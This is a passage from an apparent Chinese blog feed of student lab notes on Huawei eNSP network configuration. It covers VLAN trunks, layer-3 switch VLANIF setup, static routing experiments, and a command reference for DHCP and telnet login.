class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]vlan batch 10 20</span><br><span class="line">[Huawei]int e0/0/1</span><br><span class="line">Huawei-Ethernet0/0/1]port link-type access</span><br><span class="line">[Huawei-Ethernet0/0/1]port default vlan 10</span><br><span class="line">[Huawei-Ethernet0/0/1]quit</span><br><span class="line">[Huawei]int g0/0/2</span><br><span class="line">[Huawei-GigabitEthernet0/0/2]port link-type access</span><br><span class="line">[Huawei-GigabitEthernet0/0/2]port default vlan 20</span><br><span class="line">[Huawei-GigabitEthernet0/0/2]quit</span><br></pre></td></tr></table></figure><p>然后开始trunk配置</p><p>LSW1的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[LSW1]int e0/0/3</span><br><span class="line">[LSW1-Ethernet0/0/3]port link-type trunk</span><br><span class="line">[LSW1-Ethernet0/0/3]port trunk allow-pass vlan 10 20</span><br><span class="line">[LSW1-Ethernet0/0/3]quit</span><br></pre></td></tr></table></figure><p>LSW2的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]int e0/0/3</span><br><span class="line">[Huawei-Ethernet0/0/3]port link-type trunk</span><br><span class="line">[Huawei-port-group-trunk]port trunk allow-pass vlan 10 20</span><br><span class="line">[Huawei-port-group-trunk]quit</span><br></pre></td></tr></table></figure><p>（〃｀ 3′〃）如果ping不通，先别急哦，让子弹飞一会，~~~要么就是哪里的小细节除了问题，实在不行，再从头来一遍,反正要不了多久，也可以重启试试。~~</p><h2 id="三层交换机配置"><a href="#三层交换机配置" class="headerlink" title="三层交换机配置"></a>三层交换机配置</h2><h3 id="实验拓扑图：-1"><a href="#实验拓扑图：-1" class="headerlink" title="实验拓扑图："></a>实验拓扑图：</h3><p><img src="/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E4%BA%A4%E6%8D%A2%E6%9C%BA%E9%85%8D%E7%BD%AE/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-01%20225507.png" alt="屏幕截图 2024-03-01 225507"></p><h3 id="实验过程：-1"><a href="#实验过程：-1" class="headerlink" title="实验过程："></a>实验过程：</h3><p>将主机的ip，网关等先配置好，然后开始配置二层交换机和主机相连，配置vlan</p><p>LSW2的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sysname LSW 2</span><br><span class="line">[LSW 2]vlan batch 10 20</span><br><span class="line">[LSW 2]int e0/0/2</span><br><span class="line">[LSW 2-Ethernet0/0/2]port link-type access</span><br><span class="line">[LSW 2-Ethernet0/0/2]port default vlan 10</span><br><span class="line">[LSW 2-Ethernet0/0/2]quit</span><br><span class="line">LSW 2]int e0/0/3</span><br><span class="line">[LSW 2-Ethernet0/0/3]port link-type access</span><br><span class="line">[LSW 2-Ethernet0/0/3]port default vlan 20</span><br><span class="line">[LSW 2-Ethernet0/0/3]quit</span><br></pre></td></tr></table></figure><p>LSW3的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sysname LSW 3</span><br><span class="line">[LSW 3]vlan batch 10 20</span><br><span class="line">[LSW 3]int e0/0/2</span><br><span class="line">[LSW 3-Ethernet0/0/2]port link-type access</span><br><span class="line">[LSW 3-Ethernet0/0/2]port default vlan 10</span><br><span class="line">[LSW 3-Ethernet0/0/2]quit</span><br><span class="line">[LSW 3]int e0/0/3</span><br><span class="line">[LSW 3-Ethernet0/0/3]port link-type access</span><br><span class="line">[LSW 3-Ethernet0/0/3]port default vlan 20</span><br><span class="line">[LSW 3-Ethernet0/0/3]quit</span><br></pre></td></tr></table></figure><p>然后配置二层交换机和三层交换机的trunk链路</p><p>LSW1的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sysname LSW 1</span><br><span class="line">[LSW 1]vlan batch 10 20</span><br><span class="line">[LSW 1]int g0/0/1</span><br><span class="line">[LSW 1-GigabitEthernet0/0/1]port link-type trunk</span><br><span class="line">[LSW 1-GigabitEthernet0/0/1]port trunk allow-pass vlan 10 20</span><br><span class="line">[LSW 1-GigabitEthernet0/0/1]quit</span><br><span class="line">[LSW 1]int g0/0/2</span><br><span class="line">[LSW 1-GigabitEthernet0/0/2]port link-type trunk</span><br><span class="line">[LSW 1-port-group-trunk]port trunk allow-pass vlan 10 20</span><br><span class="line">[LSW 1-port-group-trunk]quit</span><br></pre></td></tr></table></figure><p>LSW2的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[LSW 2]int g0/0/1</span><br><span class="line">[LSW 2-GigabitEthernet0/0/1]port link-type trunk</span><br><span class="line">[LSW 2-GigabitEthernet0/0/1]port trunk allow-pass vlan 10 20</span><br><span class="line">[LSW 2-GigabitEthernet0/0/1]quit</span><br></pre></td></tr></table></figure><p>LSW3的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[LSW 3]int g0/0/1</span><br><span class="line">[LSW 3-GigabitEthernet0/0/1]port link-type trunk</span><br><span class="line">[LSW 3-GigabitEthernet0/0/1]port trunk allow-pass vlan 10 20</span><br><span class="line">[LSW 3-GigabitEthernet0/0/1]quit</span><br></pre></td></tr></table></figure><p>最后开始配置vlanif，给予ip</p><p>LSW1的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[LSW 1]int vlanif 10</span><br><span class="line">[LSW 1-Vlanif10]ip address 192.168.10.254 24</span><br><span class="line">[LSW 1-Vlanif10]quit</span><br><span class="line">[LSW 1]int vlanif 20</span><br><span class="line">[LSW 1-Vlanif20]ip address 192.168.20.254 24</span><br><span class="line">[LSW 1-Vlanif20]quit</span><br></pre></td></tr></table></figure><p><del>按理来说，到这里就已经完成了，没啥问题了，但我配置交换机的时候，一直出问题，还是找不到原因的问题，这里建议save保存配置之后重启在尝试。</del></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网基实践题-交换机配置&quot;&gt;&lt;a href=&quot;#网基实践题-交换机配置&quot; class=&quot;headerlink&quot; title=&quot;网基实践题-交换机配置&quot;&gt;&lt;/a&gt;网基实践题-交换机配置&lt;/h1&gt;&lt;h2 id=&quot;二层交换机配置&quot;&gt;&lt;a href=&quot;#二层交换机配置&quot; c</summary>
      
    
    
    
    <category term="信息安全产品配置与应用" scheme="https://w-sqrt7.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="网基" scheme="https://w-sqrt7.github.io/tags/%E7%BD%91%E5%9F%BA/"/>
    
    <category term="eNSP" scheme="https://w-sqrt7.github.io/tags/eNSP/"/>
    
  </entry>
  
  <entry>
    <title>网基实践题-静态路由</title>
    <link href="https://w-sqrt7.github.io/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/"/>
    <id>https://w-sqrt7.github.io/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/</id>
    <published>2024-02-27T07:18:09.233Z</published>
    <updated>2024-03-05T01:56:27.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网基实践题-静态路由"><a href="#网基实践题-静态路由" class="headerlink" title="网基实践题-静态路由"></a>网基实践题-静态路由</h1><h2 id="静态路由-实验一"><a href="#静态路由-实验一" class="headerlink" title="静态路由-实验一"></a>静态路由-实验一</h2><h3 id="实验拓扑图："><a href="#实验拓扑图：" class="headerlink" title="实验拓扑图："></a>实验拓扑图：</h3><p><img src="/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-27%20142053.png"></p><h3 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h3><p>首先将PC1和PC2指定的ip分别配置，留意一下网关的地址哦！</p><p><img src="/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-27%20153610.png" alt="屏幕截图 2024-02-27 153610"></p><p>然后开始配置两个路由器</p><p><img src="/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-27%20164627.png" alt="屏幕截图 2024-02-27 164627"></p><p>AR1配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sysname AR 1</span><br><span class="line">[AR 1]int g0/0/0</span><br><span class="line">[AR 1-GigabitEthernet0/0/0]ip address 192.168.10.254 24</span><br><span class="line">[AR 1-GigabitEthernet0/0/0]quit</span><br><span class="line">[AR 1]int g0/0/1</span><br><span class="line">[AR 1-GigabitEthernet0/0/1]ip address 192.168.20.1 24</span><br><span class="line">[AR 1-GigabitEthernet0/0/1]quit</span><br><span class="line"></span><br><span class="line">[AR 1]ip route-static 192.168.30.0 24 192.168.20.2</span><br></pre></td></tr></table></figure><p>AR2配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">Huawei]sysname AR 2</span><br><span class="line">[AR 2]int g0/0/1</span><br><span class="line">[AR 2-GigabitEthernet0/0/1]ip address 192.168.20.2 24</span><br><span class="line">[AR 2-GigabitEthernet0/0/1]quit</span><br><span class="line">[AR 2]int g0/0/0</span><br><span class="line">[AR 2-GigabitEthernet0/0/0]ip address 192.168.30.254 24</span><br><span class="line">[AR 2-GigabitEthernet0/0/0]quit</span><br><span class="line"></span><br><span class="line">[AR 2]ip route-static 192.168.10.0 24 192.168.20.1</span><br></pre></td></tr></table></figure><p>尝试测试两台主机是否可以互相ping通</p><p><img src="/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-27%20170102.png" alt="屏幕截图 2024-02-27 170102"></p><h2 id="静态路由-实验二"><a href="#静态路由-实验二" class="headerlink" title="静态路由-实验二"></a>静态路由-实验二</h2><h3 id="实验拓扑图：-1"><a href="#实验拓扑图：-1" class="headerlink" title="实验拓扑图："></a>实验拓扑图：</h3><p><img src="/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-27%20172358.png" alt="屏幕截图 2024-02-27 172358"></p><h3 id="实验过程：-1"><a href="#实验过程：-1" class="headerlink" title="实验过程："></a>实验过程：</h3><p>先将pc机的ip等进行配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PC1</span><br><span class="line">ip地址：192.168.10.100</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">网关：192.168.10.254  //注意网关就是AR1的g0/0/0端口的IP地址</span><br><span class="line"></span><br><span class="line">PC2</span><br><span class="line">ip地址：192.168.30.100</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">网关：192.168.30.254</span><br><span class="line"></span><br><span class="line">PC3</span><br><span class="line">ip地址：8.8.4.100</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">网关：8.8.4.254</span><br></pre></td></tr></table></figure><p>将各个路由的端口配置ip</p><p>AR1的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sysname AR 1</span><br><span class="line">[AR 1]int g0/0/0</span><br><span class="line">[AR 1-GigabitEthernet0/0/0]ip address 192.168.10.254 24</span><br><span class="line">[AR 1-GigabitEthernet0/0/0]quit</span><br><span class="line">[AR 1]int g0/0/1</span><br><span class="line">[AR 1-GigabitEthernet0/0/1]ip address 192.168.20.1 24</span><br><span class="line">[AR 1-GigabitEthernet0/0/1]quit</span><br></pre></td></tr></table></figure><p>AR2的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]int g0/0/0</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]ip address 192.168.20.2 24</span><br><span class="line">Huawei-GigabitEthernet0/0/0]quit</span><br><span class="line">[Huawei]int g0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1]ip address 10.10.10.1 24</span><br><span class="line">[Huawei-GigabitEthernet0/0/1]quit</span><br><span class="line">[Huawei]int g0/0/2</span><br><span class="line">[Huawei-GigabitEthernet0/0/2]ip address 8.8.4.254 24</span><br><span class="line">[Huawei-GigabitEthernet0/0/2]quit</span><br></pre></td></tr></table></figure><p>AR3的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]int g0/0/1</span><br><span class="line">[Huawei-GigabitEthernet0/0/1]ip address 192.168.30.1 24</span><br><span class="line">[Huawei-GigabitEthernet0/0/1]quit</span><br><span class="line">[Huawei]int g0/0/0</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]ip address 10.10.10.2 24</span><br><span class="line">[Huawei-GigabitEthernet0/0/0]quit</span><br></pre></td></tr></table></figure><p>继续进行route-static配置</p><p>AR1的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[AR 1]ip route-static 10.10.10.0 24 192.168.20.2 </span><br><span class="line">[AR 1]ip route-static 8.8.4.1 24 192.168.20.2</span><br><span class="line">[AR 1]ip route-static 192.168.30.0 24 192.168.20.2</span><br></pre></td></tr></table></figure><p>AR2的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]ip route-static 192.168.30.0 24 10.10.10.2</span><br><span class="line">[Huawei]ip route-static 192.168.10.0 24 192.168.20.1</span><br></pre></td></tr></table></figure><p>AR3的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]ip route-static 192.168.20.0 24 10.10.10.1</span><br><span class="line">[Huawei]ip route-static 8.8.4.1 24 10.10.10.1</span><br><span class="line">[Huawei]ip route-static 192.168.10.0 24 10.10.10.1</span><br></pre></td></tr></table></figure><p>注意交换机不用管的，然后尝试ping命令发现可以成功</p><p>这里稍微提一下ip route-static的，<code>ip route-static 网络地址 子网掩码 下一跳</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网基实践题-静态路由&quot;&gt;&lt;a href=&quot;#网基实践题-静态路由&quot; class=&quot;headerlink&quot; title=&quot;网基实践题-静态路由&quot;&gt;&lt;/a&gt;网基实践题-静态路由&lt;/h1&gt;&lt;h2 id=&quot;静态路由-实验一&quot;&gt;&lt;a href=&quot;#静态路由-实验一&quot; cla</summary>
      
    
    
    
    <category term="信息安全产品配置与应用" scheme="https://w-sqrt7.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="网基" scheme="https://w-sqrt7.github.io/tags/%E7%BD%91%E5%9F%BA/"/>
    
    <category term="eNSP" scheme="https://w-sqrt7.github.io/tags/eNSP/"/>
    
  </entry>
  
  <entry>
    <title>网基实践题-参考命令</title>
    <link href="https://w-sqrt7.github.io/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E5%8F%82%E8%80%83%E5%91%BD%E4%BB%A4/"/>
    <id>https://w-sqrt7.github.io/2024/02/27/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E5%8F%82%E8%80%83%E5%91%BD%E4%BB%A4/</id>
    <published>2024-02-27T07:18:09.227Z</published>
    <updated>2024-04-11T11:23:20.904Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网基实践题-参考命令"><a href="#网基实践题-参考命令" class="headerlink" title="网基实践题-参考命令"></a>网基实践题-参考命令</h1><h2 id="ENSP关闭模拟终端提示"><a href="#ENSP关闭模拟终端提示" class="headerlink" title="ENSP关闭模拟终端提示"></a>ENSP关闭模拟终端提示</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">undo terminal monitor#关闭模拟终端提示</span><br><span class="line">undo info-center enable#关闭终端的告警或日志显示</span><br><span class="line">undo info enable#关闭信息提示</span><br></pre></td></tr></table></figure><h3 id="配置Access接口，并加入对应的VLAN"><a href="#配置Access接口，并加入对应的VLAN" class="headerlink" title="配置Access接口，并加入对应的VLAN"></a>配置Access接口，并加入对应的VLAN</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface GigabitEthernet 0/0/1//进入g0/0/1接口</span><br><span class="line">[SW1-GigabitEthernet0/0/1]port link-type access//设置连接方式为access</span><br><span class="line">[SW1-GigabitEthernet0/0/1]port default vlan 10//设置默认vlan10 </span><br><span class="line">[SW1-GigabitEthernet0/0/1]quit</span><br></pre></td></tr></table></figure><h3 id="配置Trunk接口，并创建对应的允许通过列表"><a href="#配置Trunk接口，并创建对应的允许通过列表" class="headerlink" title="配置Trunk接口，并创建对应的允许通过列表"></a>配置Trunk接口，并创建对应的允许通过列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]interface GigabitEthernet 0/0/3</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port link-type trunk//设置连接方式为trunk，常用于和上层连接的端口</span><br><span class="line">[SW1-GigabitEthernet0/0/3]port trunk allow-pass vlan 10 20//设置允许vlan10和vlan20的数据通过，可设值vlan all</span><br><span class="line">[SW1-GigabitEthernet0/0/3]quit</span><br></pre></td></tr></table></figure><h3 id="配置接口IP"><a href="#配置接口IP" class="headerlink" title="配置接口IP"></a>配置接口IP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]interface GigabitEthernet 0/0/1</span><br><span class="line">[Huawei-GigabitEthernet 0/0/1]ip address 192.168.50.1 24</span><br></pre></td></tr></table></figure><h3 id="配置子接口IP，动态dot1q封装"><a href="#配置子接口IP，动态dot1q封装" class="headerlink" title="配置子接口IP，动态dot1q封装"></a>配置子接口IP，动态dot1q封装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]interface GigabitEthernet 0/0/0.1//进入g0/0/0.1子接口</span><br><span class="line">[Huawei-GigabitEthernet 0/0/0.1]ip address 192.168.10.1 24//配置子接口IP地址</span><br><span class="line">[Huawei-GigabitEthernet 0/0/0.1]dot1q termination vid 10//给子接口封装dot1q协议，允许vlan10 通过</span><br><span class="line">[Huawei-GigabitEthernet 0/0/0.1]arp broadcast enable//启动arp广播功能功能</span><br><span class="line">[Huawei-GigabitEthernet 0/0/0.1]quit</span><br><span class="line">[Huawei]int g0/0/0.2</span><br><span class="line">[Huawei-GigabitEthernet 0/0/0.2]dot1q termination vid 20</span><br><span class="line">[Huawei-GigabitEthernet 0/0/0.2]ip address 192.168.20.1 24</span><br><span class="line">[Huawei-GigabitEthernet 0/0/0.2]arp broadcast enable</span><br><span class="line">[Huawei-GigabitEthernet 0/0/0.2]quit</span><br></pre></td></tr></table></figure><h3 id="创建vlan-配置vlanip"><a href="#创建vlan-配置vlanip" class="headerlink" title="创建vlan,配置vlanip"></a>创建vlan,配置vlanip</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]vlan batch 100 200//创vlan 100 和vlan 200</span><br><span class="line">[Huawei]vlan batch 100 to 200</span><br><span class="line">[Huawei]vlan 100</span><br><span class="line"></span><br><span class="line">[Huawei]int Vlanif 1 //配置vlan的ip地址</span><br><span class="line">[Huawei-Vlanif 1]ip address 172.16.50.1 24</span><br></pre></td></tr></table></figure><h3 id="配置DHCP"><a href="#配置DHCP" class="headerlink" title="配置DHCP"></a>配置DHCP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;sys</span><br><span class="line">[Huawei]sysname AR3</span><br><span class="line">[AR3]dhcp enable//启用DHCP功能</span><br><span class="line">[AR3]ip pool testpool//设置地址池，testpool为自定的地址池名称</span><br><span class="line">[AR3-ip-pool-testpool]gateway-list 192.168.10.1//配置网关</span><br><span class="line">[AR3-ip-pool-testpool]network 192.168.10.0 mask 255.255.255.0//配置网段</span><br><span class="line">[AR3-ip-pool-testpool]excluded-ip-address 192.168.10.2 192.168.10.100//禁用某个段的IP</span><br><span class="line">[AR3-ip-pool-testpool]excluded-ip-address 192.168.10.201 192.168.10.254</span><br><span class="line">[AR3-ip-pool-testpool]dns-list 114.114.114.114//配置dns</span><br><span class="line">[AR3-ip-pool-testpool]lease day 2 hour 5 minute 30//配置逾期时间</span><br><span class="line">[AR3-ip-pool-testpool]quit</span><br><span class="line">[AR3]int g0/0/0//配置连接的接口</span><br><span class="line">[AR3-GigabitEthernet0/0/0]ip address 192.168.10.1 24 //给端口设置ip地址，即网关地址</span><br><span class="line">[AR3-GigabitEthernet0/0/0]dhcp select global//选择全局模式</span><br><span class="line">[AR3-GigabitEthernet0/0/0]quit</span><br></pre></td></tr></table></figure><h3 id="配置telnet远程登录"><a href="#配置telnet远程登录" class="headerlink" title="配置telnet远程登录"></a>配置telnet远程登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;AR 1&gt;sys</span><br><span class="line">[AR 1]telnet server enable//启用Telnet服务器</span><br><span class="line">[AR 1]user-interface vty 0 4//选择虚拟终端接口范围，从0到4。VTY（Virtual Teletype）接口通常用于远程登录，如Telnet或SSH。0到4即最多同时5个虚拟终端会话</span><br><span class="line">[AR 1-ui-vty0-4]authentication-mode  aaa//设置认证模式为AAA（Authentication, Authorization, and Accounting）。这意味着远程用户登录时，将使用AAA框架进行身份验证、授权和计费。即需要用户名和密码，设为password时，只需要密码</span><br><span class="line">[AR 1-ui-vty0-4](user privilege level 3)//设置用户权限级别为3,可进入aaa配置单个用户的权限</span><br><span class="line">[AR 1-ui-vty0-4]quit</span><br><span class="line">[AR 1]aaa//进入AAA配置模式。从这里开始，您可以配置与AAA相关的各种参数，如用户、角色、权限等。</span><br><span class="line">[AR 1-aaa]local-user service-type telnet//用于指定本地用户的接入类型为 Telnet</span><br><span class="line">[AR 1-aaa]local-user sqrt password cipher abcd (privilege level 3)//在AAA模式下，创建一个本地用户名为“sqrt”，并为其设置加密密码“abcd”。cipher 指的是密码是以加密方式存储的，可使用simple，即明文方式</span><br></pre></td></tr></table></figure><h2 id="常用命令总结（转载）"><a href="#常用命令总结（转载）" class="headerlink" title="常用命令总结（转载）"></a>常用命令总结（转载）</h2><p>原文链接：<a href="https://blog.csdn.net/qq_43085848/article/details/121679021">https://blog.csdn.net/qq_43085848/article/details/121679021</a></p><h4 id="一、华为设备命令视图"><a href="#一、华为设备命令视图" class="headerlink" title="一、华为设备命令视图"></a>一、华为设备命令视图</h4><p>以下是华为设备的常用命令视图：<br>用户视图：&lt; Huawei&gt;<br>系统视图：&lt; Huawei&gt;system-view&#x2F;sys [Huawei]<br>接口视图：<br>&lt; Huawei&gt;system-view&#x2F;sys<br>[Huawei]interface&#x2F;int Ethernet0&#x2F;0&#x2F;1<br>[Huawei- Ethernet0&#x2F;0&#x2F;1]<br>路由协议视图：[Huawei]isis<br>[Huawei- isis-1]</p><h4 id="二、设置设备名称"><a href="#二、设置设备名称" class="headerlink" title="二、设置设备名称"></a>二、设置设备名称</h4><p>sysname&#x2F;sy命令设置设备的名称<br>&lt; Huawei&gt; system-view<br>[Huawei] sysname Switch 更改设备名称<br>[Switch]</p><h4 id="三、常用基本命令"><a href="#三、常用基本命令" class="headerlink" title="三、常用基本命令"></a>三、常用基本命令</h4><p>1、quit 命令 返回上一级视图<br>2、return 命令 直接返回&lt; Huawei&gt;用户视图<br>3、save 命令 在&lt; Huawei&gt;用户视图使用，保存配置<br>4、reboot 命令 重启设备<br>5、shutdown 命令 关闭端口<br>undo shutdown 命令 激活端口<br>6、undo 